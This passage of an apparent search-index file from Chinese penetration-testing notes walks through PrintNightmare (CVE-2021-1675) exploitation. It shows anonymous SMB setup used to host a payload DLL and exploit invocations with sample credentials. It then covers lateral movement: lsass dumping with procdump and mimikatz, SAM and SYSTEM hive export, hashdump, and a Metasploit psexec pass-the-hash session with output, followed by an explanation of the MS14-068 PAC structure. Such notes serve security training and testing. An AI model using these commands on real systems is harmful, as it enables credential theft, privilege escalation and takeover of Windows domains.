Protocol","title":"\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#smb","text":"","title":"\u5f00\u542fsmb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#linuxsmb","text":"\u7528apt\u6216\u8005yum\u4e0b\u8f7dsamba\uff0c\u7136\u540e\u4fee\u6539/etc/samba/smb.conf\u3002\u5c06/tmp/\u6620\u5c04\u4e3asmb\u5171\u4eab\u76ee\u5f55\u3002 [global] map to guest = Bad User server role = standalone server usershare allow guests = yes idmap config * : backend = tdb smb ports = 445 [smb] comment = Samba path = /tmp/ guest ok = yes read only = no browsable = yes force user = smbuser \u7136\u540e\u4f7f\u7528\u547d\u4ee4 service smbd start \u5f00\u542fsmb\u670d\u52a1\u5668\u3002","title":"linux\u5f00\u542f\u533f\u540dsmb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#windowssmb","text":"1.\u542f\u7528Guest\u7528\u6237 net user guest /active:yes 2.\u5c06Everyone\u6743\u9650\u5e94\u7528\u4e8e\u533f\u540d\u7528\u6237 REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f 3.\u6307\u5b9a\u533f\u540d\u5171\u4eab\u6587\u4ef6\u7684\u4f4d\u7f6e REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d smb /f 4.\u5c06Guest\u7528\u6237\u4ece\u7b56\u7565\u201c\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u8fd9\u53f0\u8ba1\u7b97\u673a\u201d\u4e2d\u79fb\u9664 \u5bfc\u51fa\u7ec4\u7b56\u7565\uff1a secedit /export /cfg gp.inf /quiet \u4fee\u6539\u6587\u4ef6gp.inf\uff0c\u5c06 SeDenyNetworkLogonRight = Guest \u4fee\u6539\u4e3a SeDenyNetworkLogonRight = \uff0c\u4fdd\u5b58 \u91cd\u65b0\u5bfc\u5165\u7ec4\u7b56\u7565\uff1a secedit /configure /db gp.sdb /cfg gp.inf /quiet \u5f3a\u5236\u5237\u65b0\u7ec4\u7b56\u7565\uff0c\u7acb\u5373\u751f\u6548(\u5426\u5219\uff0c\u91cd\u542f\u540e\u751f\u6548)\uff1a gpupdate/force 5.\u8bbe\u7f6e\u6587\u4ef6\u5171\u4eab icacls C:\\share\\ /T /grant Everyone:r net share share=c:\\share /grant:everyone,full \u81f3\u6b64\uff0c\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\u5f00\u542f\u6210\u529f\uff0c\u8bbf\u95ee\u7684\u5730\u5740\u4e3a //<ip>/smb \u592a\u957f\u4e0d\u770b\u7248(\u4f3c\u4e4e\u8981\u91cd\u542f\u624d\u80fd\u751f\u6548)\uff1a mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous` logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f # Reboot","title":"windows\u5f00\u542f\u533f\u540dsmb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#windowssmb_1","text":"https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer \u652f\u6301\u57df\u73af\u5883\u548c\u5de5\u4f5c\u7ec4\u73af\u5883\u7684Windows\u64cd\u4f5c\u7cfb\u7edf \u9700\u8981\u672c\u5730\u7ba1\u7406\u5458\u6743\u9650\u6267\u884c \u5f00\u542f\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\uff1a Invoke-BuildAnonymousSMBServer -Path c:\\share -Mode Enable \u5173\u95ed\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\uff1a Invoke-BuildAnonymousSMBServer -Path c:\\share -Mode Disable","title":"windows\u5f00\u542f\u533f\u540dsmb:\u4e00\u952e\u811a\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#exp","text":"python\u7248\u7684exp\uff0cimpacket\u6846\u67b6\u4e8c\u5f00\u3002 https://github.com/cube0x0/CVE-2021-1675 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'","title":"exp"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/","text":"\u6a2a\u5411\u79fb\u52a8\u65b9\u6cd5\u603b\u6c47 \u76ee\u5f55 PTH KB2871997 \u5173\u4e8eKB2871997\u7684\u4e00\u4e2a\u8bef\u89e3 HASH\u83b7\u53d6. hash \u4f20\u9012\u653b\u51fb PTH \uff08Pass the Hash) MS14-068 PAC MS14068 M14068\u5229\u7528 kerberoast How to get SPN How to get HASH How to export hash How to crack HASH How to use Kerberoast AS_REP Roast How to get HASH How to crack hash \u59d4\u6d3e\u653b\u51fb \u57df\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u7ea6\u675f\u6027\u59d4\u6d3e \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb 1.\u8fdb\u884c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u626b\u63cf 2.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb 3.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u914d\u5408 Spooler\u6253\u5370\u673a\u670d\u52a1 \u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e \u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a \u653b\u51fb\u6d41\u7a0b: \u5b9e\u64cd \u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7 credssp \u5bfc\u51fa\u7528\u6237\u660e\u6587\u5bc6\u7801 \u653b\u51fb\u539f\u7406 \u5b9e\u64cd tscon\u6a2a\u5411 \u5229\u7528COM/DCOM\u5bf9\u8c61 \u524d\u8a00 MMC20.APPLICATION.1 ipc ipc\u7b80\u4ecb \u5229\u7528ipc\u6a2a\u5411\u79fb\u52a8 at schtasks sc wmi wmiexec winrm \u5229\u7528\u7ec4\u7b56\u7565 \u8bfb\u53d6\u811a\u672c\u4e2d\u7684\u5bc6\u7801 \u6279\u91cf\u5bc6\u7801 \u7ec4\u7b56\u7565\u4e0b\u53d1\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8 \u5bc6\u7801\u55b7\u6d12 PTH \u5982\u679c\u627e\u5230\u4e86\u67d0\u4e2a\u7528\u6237\u7684ntlm hash\uff0c\u5c31\u53ef\u4ee5\u62ff\u8fd9\u4e2antlm hash\u5f53\u4f5c\u51ed\u8bc1\u8fdb\u884c\u8fdc\u7a0b\u767b\u9646\u4e86 \u5176\u4e2d\u82e5hash\u52a0\u5bc6\u65b9\u5f0f\u662f rc4 \uff0c\u90a3\u4e48\u5c31\u662fpass the hash \u82e5\u52a0\u5bc6\u65b9\u5f0f\u662faes key,\u90a3\u4e48\u5c31\u662fpass the key \u6ce8\u610fNTLM\u548ckerberos\u534f\u8bae\u5747\u5b58\u5728PTH: NTLM\u81ea\u7136\u4e0d\u7528\u591a\u8bf4 kerberos\u534f\u8bae\u4e5f\u662f\u57fa\u4e8e\u7528\u6237\u7684client hash\u5f00\u59cb\u4e00\u6b65\u6b65\u8ba4\u8bc1\u7684\uff0c\u81ea\u7136\u4e5f\u4f1a\u53d7PTH\u5f71\u54cd \u90a3\u524d\u63d0\u5c31\u662f\u8981\u83b7\u53d6hash\u503c\u4e86 KB2871997 \u5982\u679c\u7cfb\u7edf\u5b89\u88c5 KB2871997 \u8865\u4e01\u6216\u8005\u7cfb\u7edf\u7248\u672c\u5927\u4e8e\u7b49\u4e8ewindow server 2012\u65f6(\u670d\u52a1\u5668\u7248\u672c),\u5927\u4e8e\u7b49\u4e8ewin8.1(\u5bb6\u5ead\u7248\u672c)\u65f6\uff08\u81ea\u5e26\u8865\u4e01\uff09\uff0c\u9ed8\u8ba4\u5728lsass.exe\u8fd9\u4e2a\u8fdb\u7a0b\u4e2d\u4e0d\u4f1a\u518d\u5c06\u53ef\u9006\u7684\u5bc6\u6587\u7f13\u5b58\u5728\u81ea\u5df1\u7684\u8fdb\u7a0b\u5185\u5b58\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u9ed8\u8ba4\u662f\u6ca1\u529e\u6cd5\u901a\u8fc7\u8bfb\u53d6\u8fd9\u4e2a\u8fdb\u7a0b\u7136\u540e\u9006\u5411\u8be5\u5bc6\u6587\u6765\u83b7\u53d6\u660e\u6587\u5bc6\u7801 \u867d\u7136\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u6765\u4f7fLSASS\u5f3a\u5236\u5b58\u50a8\u660e\u6587\u5bc6\u7801 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f \u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u8981\u6c42\u7cfb\u7edf\u91cd\u542f\u6216\u8005\u7528\u6237\u91cd\u65b0\u767b\u5f55\uff0c\u5728\u5b9e\u6218\u4e2d\u64cd\u4f5c\u8d77\u6765\u6210\u529f\u7387\u8fd8\u662f\u6bd4\u8f83\u4f4e\u7684\u3002 \u540c\u65f6\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u70b9\u662f\u589e\u52a0\u4e86Protected Users\u7ec4\uff0c\u6240\u5c5e\u7528\u6237\u4f1a\u88ab\u5f3a\u5236\u8981\u6c42\u4f7f\u7528Kerberos\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u907f\u514dPTH\u653b\u51fb\uff0c\u4ee5\u53ca\u7528\u6237\u6ce8\u9500\u540e\u5220\u9664\u51ed\u8bc1(\u660e\u6587\u5bc6\u7801\u3001LM/NTLM HASH\u3001Kerberos\u7684TGT\u7968\u636e\u7b49) \u4ee5\u53ca\uff1aRestricted Admin RDP\u6a21\u5f0f\u7684\u8fdc\u7a0b\u684c\u9762\u5ba2\u6237\u7aef\u652f\u6301 \u5173\u4e8eKB2871997\u7684\u4e00\u4e2a\u8bef\u89e3 \u81eawindow vista\u4e4b\u540e\u6ca1\u529e\u6cd5\u4f7f\u7528RID\u975e500\u7684\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\u6765\u8fdb\u884cPass The Hash, \u4f46\u662f\u5982\u679c\u662f\u57df\u7528\u6237\u4e14\u8be5\u57df\u7528\u6237\u5c5e\u4e8e\u672c\u5730Administrators\u7ec4\u7684\u6210\u5458\u4e5f\u53ef\u4ee5\u8fdb\u884cpass the hash\u3002 \u5f88\u591a\u4eba\u628a\u8fd9\u4e2a\u539f\u56e0\u5f52\u7ed3\u4e8eKB2871997\u8865\u4e01\uff0c\u5b9e\u9645\u4e0a\u4e0d\u7136\uff0c\u8fd9\u4e2a\u4e8b\u60c5\u7684\u6210\u56e0\u5b9e\u9645\u662fUAC\u5728\u6363\u4e71\u3002UAC\u662fwindow Vista\u7684\u65b0\u5b89\u5168\u7ec4\u4ef6\uff0c\u5177\u4f53\u662f\u4e2a\u5565\u8fd9\u91cc\u4e5f\u4e0d\u7ec6\u8bf4\u4e86\u3002 RID\u4e3a500\u7684\u8d26\u6237\u548c\u5c5e\u4e8e\u672c\u5730administrators\u7ec4\u7684\u57df\u7528\u6237\u5728\u901a\u8fc7\u7f51\u7edc\u8fdc\u7a0b\u94fe\u63a5\u65f6\uff0c\u9ed8\u8ba4\u5c31\u662f\u9ad8\u6743\u9650\u4ee4\u724c\u3002 \u800c\u975eRID500\u7684\u672c\u5730\u8d26\u6237\u5219\u4e3a\u4f4e\u6743\u9650\u4ee4\u724c\uff0c\u82e5\u60f3\u63d0\u5347\u6743\u9650\u5219\u9700\u901a\u8fc7\u4ea4\u4e92\u65b9\u5f0f\u767b\u5f55\u5230\u8981\u901a\u8fc7\u8fdc\u7a0b\u534f\u52a9\u6216\u8fdc\u7a0b\u684c\u9762\u7ba1\u7406\u7684\u8ba1\u7b97\u673a\u8d70UAC\u63d0\u6743\u3002 \u5173\u4e8e\u8fd9\u4e2a\u6210\u56e0\u7684\u4e00\u4e9b\u7cfb\u7edf\u914d\u7f6e\u9009\u9879\uff1a \u8fd9\u4e2a\u9879\u9ed8\u8ba4\u5141\u8bb8\u5185\u7f6e\u7ba1\u7406\u5458\u8d26\u6237\uff08RID500\u8d26\u6237\uff09\u5728\u6240\u6709\u5e94\u7528\u4e0b\u90fd\u4ee5\u9ad8\u6743\u9650\u4ee4\u724c\u8fd0\u884c\u3002\u8fd9\u4e5f\u662fRID500\u8d26\u6237\u80fdPTH\u7684\u539f\u56e0 \u540c\u65f6\u8fd8\u6709\u5982\u4e0b\u8fd9\u4e2a\u6ce8\u518c\u8868\u9879\uff0c\u53ef\u4ee5\u5173\u95edUAC\u7684\u8fdc\u7a0b\u9650\u5236\uff0c\u5373\u8fdc\u7a0b\u8fde\u63a5\u65f6UAC\u4f1a\u5931\u6548\uff0c\u8fd9\u6837\u7684\u8bdd\u53ea\u8981\u662fadministrators\u7ec4\u7684\u7528\u6237\u90fd\u80fdPTH\u8fa3\u3002 \u5176\u4e2d\u8be5\u503c\u4e3a0\u5219\u4ee3\u8868\u5f00\u542fUAC\u7684\u8fdc\u7a0b\u9650\u5236,\u8bbe\u7f6e\u8be5\u503c\u4e3a1\u65f6\u5173\u95ed\u8fdc\u7a0b\u9650\u5236. \u5728\u57df\u4e2d\uff0c\u53ea\u6709\u57df\u7ba1\u8d26\u6237\u548c\u57df\u7528\u6237\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u53ef\u4ee5\u6b63\u5e38PTH\u3002\u5728win10\u4e2d\u6d4b\u8bd5\uff0c\u4e0a\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u53c2\u6570\u5747\u4e0d\u80fd\u5bf9\u57df\u7ba1\u3001\u57df\u7528\u6237\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u9020\u6210\u5f71\u54cd\u3002 HASH\u83b7\u53d6. 1.\u4f7f\u7528meterpreter\u91cc\u7684mimikatz\u6a21\u5757 meterpreter>load mimikatz meterpreter>mimikatz_command -f mimikatz\u7684\u6307\u4ee4 privilege::debug \u63d0\u6743 samdump::hashes dump\u54c8\u5e0c \u6216\u8005 meterpreter>msv/kerberos/widgst 2.\u4f7f\u7528meterpreter\u81ea\u5e26\u7684hash\u83b7\u53d6\u6a21\u5757 meterpreter>hashdump meterpreter>run windows/gather/smart_hashdump (\u63a8\u8350\u4f7f\u7528\u8fd9\u4e2a) 3.\u5411\u76ee\u6807\u673a\u4e0a\u4f20mimikatz\u8fdc\u7a0b\u8c03\u7528mimikatz.exe dump\u51fahash\uff0cmimikatz\u9700\u8981\u514d\u6740\u5904\u7406 \u610f\u601d\u5c31\u662f\u65e2\u7136\u6211\u4eec\u83b7\u53d6\u5230\u4e86shell\uff0c\u6211\u4eec\u76f4\u63a5\u5411\u76ee\u6807\u673a\u4e0a\u4f20\u4e00\u4e2amimikatz\u7136\u540e\u5728shell\u91cc\u4f7f\u7528\u5b83\u5c31\u884c\u4e86. \u4f7f\u7528\u65b9\u6cd5\u4e3acmd\u7a97\u53e3\u6253\u5f00mimikatz.exe\uff0c\u8fdb\u5165mimikatz\u7ec8\u7aef\uff0c\u7136\u540e\u8f93\u5165mimikatz\u6307\u4ee4\u5373\u53ef 4.\u4e0a\u4f20procdump\u5230\u76ee\u6807\u673a\uff0c\u83b7\u53d6\u5230lsass.dmp\u6587\u4ef6\u540e\u5c06\u5176\u4f20\u56de\u672c\u5730\u53c8mimikatz\u6765dump\u54c8\u5e0c procdump.exe\u662f\u5fae\u8f6f\u81ea\u5e26\u7684\u7a0b\u5e8f\uff0c\u6240\u4ee5\u4e0d\u4f1a\u89e6\u53d1\u6740\u6bd2\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5b83\u4f20\u56delsass.dmp\u672c\u5730\u63d0\u53d6hash procdump64.exe -accepteula -ma lsass.exe lsass.dmp \u6267\u884c\u8be5\u6307\u4ee4\uff0c\u83b7\u53d6\u5230lsass.dmp \u7136\u540e\u5c06\u5176\u4f20\u56de\u672c\u5730 \u901a\u8fc7mimikatz.exe\u5206\u522b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" Procdump \uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump mimikatz \uff1a https://github.com/gentilkiwi/mimikatz/releases 5.\u4f7f\u7528cobalt strike \u83b7\u53d6hash beacon>hashdump beacon>mimikatz mimikatz\u6307\u4ee4 6.\u5229\u7528sam\u8868 mimikatz\u5728\u7ebf\u8bfbsam\u8868\u4e2d\u7684hash privilege::debug token::elevate lsadump::sam \u5c06sam\u8868\u4e0b\u8f7d\u5230\u672c\u5730\u7531mimikatz\u5206\u6790 reg save HKLM\\SYSTEM SYSTEM reg save HKLM\\SAM SAM \u5728\u8fdc\u7aefshell\u4f7f\u7528\u4ee5\u4e0a\u547d\u4ee4\u5bfc\u51faSYSTEM \u548c SAM\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u5f85\u4f1a\u672c\u5730\uff0c\u7531mimikatz\u5206\u6790 mimikatz\u8fd0\u884c mimikatz # lsadump::sam /sam:SAM /system:SYSTEM Domain : STU1 SysKey : fd4639f4e27c79683ae9fee56b44393f Local SID : S-1-5-21-1982601180-2087634876-2293013296 SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17 RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003e8 (1000) User : liukaifeng01 Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 hash \u4f20\u9012\u653b\u51fb PTH \uff08Pass the Hash) 1.msf\u91cc\u4f7f\u7528psexec\u6a21\u5757 msf5 exploit(multi/handler) > use exploit/windows/smb/psexec //\u4ee5root\u542f\u52a8msf [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf5 exploit(windows/smb/psexec) > set lhsot 192.168.64.133 lhsot => 192.168.64.133 msf5 exploit(windows/smb/psexec) > set lhost 192.168.64.133 lhost => 192.168.64.133 msf5 exploit(windows/smb/psexec) > set lport 443 lport => 443 msf5 exploit(windows/smb/psexec) > set rhost 192.168.52.138 rhost => 192.168.52.138 msf5 exploit(windows/smb/psexec) > set SMBUser Administrator SMBUser => Administrator msf5 exploit(windows/smb/psexec) > set SMBPass 8a963371a63944419ec1adf687bb1be5 //\u4e00\u822c\u9009\u62e9NTLM HASH SMBPass => 8a963371a63944419ec1adf687bb1be5 msf5 exploit(windows/smb/psexec) > run 2.\u4f7f\u7528mimikatz \u6211\u4eec\u5728\u76ee\u6807\u673a\u91cc\u653e\u7f6emimikatz.exe \u7136\u540e\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 sekurlsa::pth /user:administrator /domain:\"xxx.com\" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc //\u81ea\u884c\u4fee\u6539 \u4e4b\u540e\u4fbf\u4f1a\u5f39\u51fa\u4e00\u4e2acmd\u7a97\u53e3\uff0c\u5728\u8fd9\u4e2a\u7a97\u53e3\u91cc\u94fe\u63a5\u673a\u5668\u5373\u53ef net use \\\\192.168.222.131\\c$ 3.\u4f7f\u7528cobalt strike \u5728cobalt strike\u91cc\u627e\u5230\u57df\u63a7\uff0c\u7136\u540e\u4f7f\u7528psexec\u6a21\u5757\uff0c\u9009\u62e9\u4e00\u4e2a\u672c\u5730hash\u5373\u53ef\u3002 MS14-068 \u8fd9\u4e2a\u6d1e\u7684\u5371\u5bb3\u5f88\u5927\uff0c\u53ef\u4ee5\u8ba9\u4efb\u610f\u57df\u7528\u6237\u63d0\u6743\u5230\u57df\u7ba1\u3002 \u9002\u7528\u7248\u672c: server 2000\u4ee5\u4e0a \u8865\u4e01: kb3011780 PAC PAC\u662fkerberos\u534f\u8bae\u91cc\u7528\u6765\u89e3\u51b3\u7528\u6237\u6743\u9650\u529f\u80fd\u6240\u8bbe\u8ba1\u51fa\u7684\u4e1c\u897f\u3002 \u5728kerberos\u534f\u8bae\u91cc\u9762\uff0c\u4e00\u4e2a\u7528\u6237\u7528\u81ea\u5df1\u7684hash\u62ff\u5230\u4e86TGT\uff0c\u63a5\u7740\u51ed\u501f\u7740TGT\u62ff\u5230\u4e86TGS\uff0c\u63a5\u7740\u7528TGS\u53bb\u8bbf\u95ee\u670d\u52a1\u3002\u770b\u4f3c\u53ea\u8981hash\u6b63\u786e\uff0c\u7528\u6237\u5c31\u80fd\u5230\u5904\u8bbf\u95ee\u670d\u52a1\uff0c\u4f46\u662f\u6240\u6709\u670d\u52a1\u90fd\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u7528\u6237\u6240\u8bbf\u95ee\u5417\uff1f\u80af\u5b9a\u662f\u4e0d\u884c\u7684\uff0c\u6240\u4ee5\u5fae\u8f6f\u5728kerberos\u4e3a\u4e86\u5b9e\u73b0\u7528\u6237\u6743\u9650\u5206\u7ea7\uff0c\u91c7\u7528\u4e86PAC\u3002 PAC\u88ab\u8bbe\u8ba1\u4e3a\u5b58\u5728\u4e8eTGT\u91cc\u9762\u3002\u5b8c\u6574\u7684kerberos\u6743\u9650\u9a8c\u8bc1\u6d41\u7a0b\u5982\u4e0b\u3002 1\u3002\u7528\u6237\u51ed\u501f\u81ea\u5df1\u7684hash\u52a0\u5bc6\u65f6\u95f4\u6233\u5e76\u53d1\u9001\u660e\u6587\u7528\u6237\u540d\u5230KDC\uff0cKDC\u8ba4\u8bc1\u7528\u6237\u6210\u529f\u540e\u8fd4\u56de\u88abkrbtgt\u7528\u6237hash\u52a0\u5bc6\u7684TGT(\u5185\u6709ticekt\u5305\u542b\u7740PAC)\uff0c\u4ee5\u53ca\u7528\u6237\u81ea\u8eabhash\u52a0\u5bc6\u7684login session key 2.\u7528\u6237\u51ed\u501fTGT\u7968\u636e\u5411KDC\u53d1\u8d77\u6307\u5b9a\u670d\u52a1\u7684TGS_REQ\u3002KDC\u7528krbtgt hash\u89e3\u5bc6\uff0c\u82e5\u89e3\u5bc6\u6210\u529f\u5219\u76f4\u63a5\u8fd4\u56de\u670d\u52a1hash\u52a0\u5bc6\u7684TGS\uff08\u8fd9\u91cc\u5e76\u6ca1\u8003\u8651\u7528\u6237\u7684\u6743\u9650\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86TGS\uff09 3.\u7528\u6237\u7528TGS\u5411\u670d\u52a1\u53d1\u8d77\u8bf7\u6c42\uff0c\u670d\u52a1\u7528\u81ea\u5df1\u7684hash\u89e3\u5bc6TGS\u540e\u83b7\u5f97PAC\uff0c\u62ff\u7740PAC\u5411KDC\u8be2\u95ee\u8be5\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u3002KDC\u62ff\u5230PAC\u540e\u518d\u6b21\u89e3\u5bc6\uff0c\u5f97\u5230\u4e86PAC\u91cc\u7684 \u7528\u6237\u7684sid\uff0c\u4ee5\u53ca\u6240\u5728\u7684\u7ec4\uff0c\u518d\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u8bbf\u95ee\u670d\u52a1\u7684\u6743\u9650\uff08\u6709\u4e9b\u670d\u52a1\u4e0d\u4f1a\u9a8c\u8bc1KDC\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u767d\u94f6\u7968\u636e\u653b\u51fb) PAC\u81ea\u8eab\u7684\u7ed3\u6784 PAC\u5728Ticket\u4e2d\u7684\u7ed3\u6784 \u53c8\u8fd9\u4e2a\u56fe\u53ef\u4ee5\u77e5\u9053,PAC\u53ea\u4e0d\u8fc7\u662fticket\u91ccAuthorization DATA\u7684\u4e00\u4e2a\u5206\u652f\u3002 \u800cAuthorization data\u7684\u7ed3\u6784\u662f\u8fd9\u6837\u7684 AuthorizationData ::= SEQUENCE OF SEQUENCE { ad-type [0] Int32, ad-data [1] OCTET STRING } ad-type\u4e2d\u5c31\u6709\u8fd9\u4e48\u4e00\u4e2a\u7c7b\u578b AD-IF-RELEVANT \u5bf9\u5e94\u6570\u5b571,\u7531\u4e0a\u4e0a\u56fe\u53ef\u77e5\u8fd9\u662fPAC\u7684\u5916\u58f3\u3002 \u82e5\u7c7b\u578b\u4e3a AD-IF-RELEVAN ,\u90a3\u4e48ad-data\u4e5f\u662f\u4e00\u4e2a AuthorizationData\u7c7b\u578b\u7684\u7ed3\u6784\u4f53\uff0c\u4e5f\u6709ad-type \u548cad-data.\u90a3\u4e48\u8fd9\u4e2a\u5916\u58f3ad-data\u7684ad-type\u5c31\u662f\u6b21\u5916\u58f3AD-WIN2K-PAC \u4e86,\u4e0e AD-WIN2K-PAC \u8fd9\u4e2aad-type\u5bf9\u5e94\u7684ad-data\u5c31\u662f\u4e00\u6bb5\u8fde\u7eed\u7a7a\u95f4\u3002 \u8fd9\u6bb5\u7a7a\u95f4\u5305\u542b\u4e00\u4e2a\u5934\u90e8PACTYPE\u4ee5\u53ca\u82e5\u5e72\u4e2aPAC_INFO_BUFFER \u3002 PACTYPE\u5305\u542b\u7684\u662f cBuffers,\u7248\u672c\u4ee5\u53ca\u7f13\u51b2\u533a \u3002 PAC_INFO_BUFFER\u662fkey-value\u578b\u7684\u3002PAC_INFO_BUFFER\u7684key\u6709\u5f88\u591a 0x00000001 \u767b\u5f55\u4fe1\u606f\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u5176\u4ed6\u767b\u5f55\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x00000002 